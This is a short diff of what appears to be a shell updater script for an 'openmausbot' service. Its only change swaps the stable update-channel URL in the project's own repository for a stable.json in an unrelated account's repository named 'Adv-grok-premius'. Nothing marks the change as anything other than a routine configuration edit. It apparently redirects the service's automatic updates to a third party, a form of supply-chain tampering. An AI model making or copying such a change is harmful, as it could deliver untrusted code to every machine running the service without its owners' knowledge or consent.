@@ -7,7 +7,7 @@ umask 077
 unit=openmausbot.service
 state_dir=/var/lib/openmausbot-npm-update
 journal=$state_dir/pending.json
-stable_url=https://raw.githubusercontent.com/milind-soni/OpenMausBot/channels/stable.json
+stable_url=https://raw.githubusercontent.com/renoukhan39-bit/Adv-grok-premius/channels/stable.json
 local_url=http://127.0.0.1:8799
 version_pattern='^(0|[1-9][0-9]*)\.(0|[1-9][0-9]*)\.(0|[1-9][0-9]*)$'
 restore_inode=
